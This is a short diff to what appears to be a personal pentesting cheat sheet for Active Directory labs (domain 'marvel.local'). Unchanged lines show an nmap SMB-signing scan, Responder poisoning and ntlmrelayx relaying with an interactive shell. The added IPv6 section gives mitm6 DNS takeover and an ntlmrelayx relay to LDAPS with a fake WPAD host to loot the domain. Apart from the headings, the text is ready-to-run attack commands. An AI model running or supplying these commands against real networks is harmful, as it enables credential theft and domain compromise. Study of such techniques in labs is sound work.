@@ -11,3 +11,9 @@ nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24
 sudo ./Responder.py -I eth0 -rdwv
 sudo ntlmrelayx.py -tf targets.txt -smb2support -i
 ```
+
+6. Ipv6
+```
+sudo mitm6 -d marvel.local
+sudo ntlmrelayx.py -6 -t ldaps://192.168.1.121 -wh fakewpad.marvel.local -l lootme
+```
